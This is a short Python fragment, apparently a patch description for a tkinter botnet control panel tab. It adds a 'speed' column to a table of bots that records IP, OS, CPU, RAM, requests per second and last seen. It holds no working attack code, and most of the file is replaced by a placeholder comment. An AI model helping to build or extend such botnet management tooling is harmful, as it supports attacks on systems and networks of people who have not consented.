import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext, simpledialog, filedialog
import threading, socket, json, time, subprocess, os, re, requests
from gui.widgets import RightClickMenu

# ... (вся предыдущая версия botnet_tab.py, но с добавлением столбца "speed" в таблицу и _update_tree_safe)
# В create_widgets изменён список columns:
columns = ("ip", "hostname", "os", "type", "country", "cpu", "ram", "status", "speed", "rps", "last_seen")
# В _update_tree_safe добавлено значение speed из bot.get("speed_mbps", 0)
